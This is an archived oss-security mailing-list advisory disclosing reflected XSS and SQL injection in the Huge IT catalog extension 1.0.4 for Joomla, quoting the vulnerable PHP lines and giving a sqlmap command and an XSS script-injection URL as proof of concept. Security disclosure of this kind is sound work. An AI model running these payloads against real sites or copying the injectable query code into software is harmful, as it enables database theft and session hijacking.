X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6172" "Thursday" "28" "July" "2016" "13:57:01" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<3DF58940-08A7-4235-B4BD-62A4210D4B0E@me.com>" "151" "[oss-security] SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla" "^Date:" nil nil "7" "2016072817:57:01" "[oss-security] SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla" (number mark "U       larry0@me.co Jul 28  151/6172  " thread-indent "\"[oss-security] SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3442 invoked by uid 550); 28 Jul 2016 17:57:23 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 3384 invoked from network); 28 Jul 2016 17:57:16 -0000
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2016-07-28_12:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1510270003 definitions=main-1607280179
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <3DF58940-08A7-4235-B4BD-62A4210D4B0E@me.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1469728623; bh=qGZA/P/wnroJhhCsnmYGe4k7OWs044LSj/hscYhPM6s=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=aYeV5w+mPwwn74Y8V+878WteizMHby5xHLnjwxAW/CT1NsU7j1j4NQ4+wwuW0UwHT
 NFe7zG6kOy0NSLBp1R3v+orV9Z8m5RecNcqyvun/Ty9aMGbZsg5Mt6K1LsqFz3LbN0
 LbioSDnLWus/9xoCU/M76m9NITz2Ioo+LZewrWpnG3BMucvlwbslVg4pc7AKDbiB72
 blC8N8Y1XVvamYdwyoDJ7h/Z4YfSF3ivI3crzDZ9q3On4L3tF+2atccIYZW+XKekDu
 okg1FAhzuDP0h4/y1j9AGjPouvzGbzKHDLzcKjBKqL4L1dpg1gXnNGPtyIc7w6g5pC
 ksWauWifNEvfw==
Date: Thu, 28 Jul 2016 13:57:01 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla
To: Open Source Security <oss-security@lists.openwall.com>

Title: SQLi and Reflected XSS in Huge IT catalog extension v1.0.4 for Joomla
Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-17
Download Site: http://extensions.joomla.org/extensions/extension/e-commerce=
/shopping-cart/catalog
Vendor: www.huge-it.com
Vendor Notified: 2015-07-17
Vendor Contact: info@huge-it.com
Description: This extension is designed to help you display the products in=
 the most attractive way. Joomla Catalog Extension has a stylish design wit=
h convenient construction for displaying the product to the customers.
Vulnerability:
The attacker must be logged in with at least manager level access or access=
 to the administrative panel to exploit this vulnerability.

Reflected XSS in file ./views/submissions/tmpl/default.php via message_id p=
arameter:

825:   <input type=3D"hidden" id=3D"message_id" value =3D"<?php echo $_GET[=
'message_id']; ?>" />


SQL Injection=20

in file ./models/submissions.php via id parameter
59-        $query =3D $db->getQuery(true);
60-        $id =3D JRequest::getVar('message_id');
61-        $this-> updateReadInfo($id);
62:        $query->select('*,#__huge_it_catalog_products.name as product_na=
me, #__huge_it_catalog_asc_seller.id as  message_id');
63-        $query->from('#__huge_it_catalog_asc_seller,#__huge_it_catalog_p=
roducts');
64-        $query->where('#__huge_it_catalog_asc_seller.product_id =3D #__h=
uge_it_catalog_products.id and #__huge_it_catalog_asc_seller.id =3D "'.$id.=
'"');
65-        $db->setQuery($query);
in file ./models/comment.php via projectId parameter:

56-        $db =3D JFactory::getDBO();
57-       $id =3D JRequest::getVar('projectId');=20
58-       $query =3D $db->getQuery(true);
59:        $query->select('*,#__huge_it_catalog_reviews.id as comId, #__hug=
e_it_catalog_reviews.name as author_name, #__huge_it_catalog_products.name =
as product_name')
60-             ->from('#__huge_it_catalog_reviews, #__huge_it_catalog_prod=
ucts')
61-         ->where('#__huge_it_catalog_reviews.product_id =3D #__huge_it_c=
atalog_products.id and #__huge_it_catalog_products.id =3D "'.$id.'"');
62-        $db->setQuery($query);

in file ./models/rating.php via projectId parameter:

55-        return $results;
56-    }=20
57-=20=20=20=20
58-    public  function getRatingById() {
59-        $db =3D JFactory::getDBO();
60:       $id =3D JRequest::getVar('projectId');=20
61-       $query =3D $db->getQuery(true);
62-        $query->select('*,#__huge_it_catalog_rating.id as ratId')
63-             ->from('#__huge_it_catalog_rating, #__huge_it_catalog_produ=
cts')
64-         ->where('#__huge_it_catalog_rating.prod_id =3D #__huge_it_catal=
og_products.id and #__huge_it_catalog_products.id =3D "'.$id.'"');
65-        $db->setQuery($query);

in file ./models/catalog.php via id parameter:

45:        $id_cat =3D JRequest::getVar('id');
46-        $query =3D $db->getQuery(true);
47-        $query->select('#__huge_it_catalog_products.name as name,'
48-                . '#__huge_it_catalog_products.id ,'
49-                . '#__huge_it_catalogs.name as catName,'
50-                . 'catalog_id,#__huge_it_catalog_products.description as=
 productDescription,#__huge_it_catalog_products.parameters as productParame=
ters,#__huge_it_catalogs.description,image_url,sl_url,sl_type,price,market_=
price,single_product_url_type,single_product_url_type,#__huge_it_catalog_pr=
oducts.link_target as productLinkTarget,#__huge_it_catalog_products.orderin=
g,#__huge_it_catalog_products.published,published_in_sl_width');
51-        $query->from(array('#__huge_it_catalogs' =3D> '#__huge_it_catalo=
gs', '#__huge_it_catalog_products' =3D> '#__huge_it_catalog_products'));
52-        $query->where('#__huge_it_catalogs.id =3D catalog_id')->where('c=
atalog_id=3D' . $id_cat);
53-        $query->order('ordering asc');
54-=20=20=20=20=20=20=20
55-        $db->setQuery($query);
--
63:        $id_cat =3D JRequest::getVar('id');
64-        $query =3D $db->getQuery(true);
65-        $query->select('*');
66-        $query->from('#__huge_it_catalog_products');
67-        $query->where('catalog_id=3D' . $id_cat);
68-        $db->setQuery($query);
69-        $results =3D $db->loadObjectList();
70-        return $results;
71-    }
72-
73-    public function save($data) {
--
121:        $id_cat =3D JRequest::getVar('id');
122-        $query =3D $db->getQuery(true);
123-        $query->update('#__huge_it_catalogs')->set('name =3D"' . $name =
. '"')->where('id=3D"' . $id_cat . '"');
124-        $db->setQuery($query);
125-        $db->execute();
126-    }
127-
128-    function selectStyle() {
129-        $db =3D JFactory::getDBO();
130-        $data =3D JRequest::get('post');
131-          $name =3D $data['name'];
--
136:        $id_cat =3D JRequest::getVar('id');
137-        $query =3D $db->getQuery(true);
138-=20=20=20=20=20=20=20=20
139-        $query->update('#__huge_it_catalogs')
140-              ->set('name =3D"' . $name . '"')
141-              ->set('catalog_list_effects_s =3D"'.$catalog_effects_list=
.'"')
142-              ->set('pagination_type =3D"'.$pagination_type.'"')
143-              ->set('count_into_page =3D"'.$count_into_page.'"')
144-              ->set('categories =3D"'.$allCategories.'"')
145-              ->where('id=3D"' . $id_cat . '"');
146-        $db->setQuery($query);
--

via removeslide parameter:

208:        $id_cat =3D JRequest::getVar('removeslide');
209:        $id =3D JRequest::getVar('id');
210-        $db =3D JFactory::getDBO();
211-        $query =3D $db->getQuery(true);
212-        $query->delete('#__huge_it_catalog_products')->where('id =3D' .=
 $id_cat);
213-        $db->setQuery($query);
214-        $db->execute();

CVE-2016-1000119 2016-1000120
Exploit Code:
	=E2=80=A2 SQLi:
	=E2=80=A2=20=20
	=E2=80=A2 $ sqlmap  --load-cookies=3Dcookies.txt -u "http://192.168.0.125/=
administrator/index.php?option=3Dcom_catalog&view=3Dcatalog&id=3D*" --dbms =
mysql=20
	=E2=80=A2=20=20
	=E2=80=A2 XSS:
	=E2=80=A2=20=20
	=E2=80=A2 http://192.168.0.125/administrator/index.php?option=3Dcom_catalo=
g&view=3Dcatalog&id=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E

Advisory: http://www.vapidlabs.com/advisory.php?v=3D167=
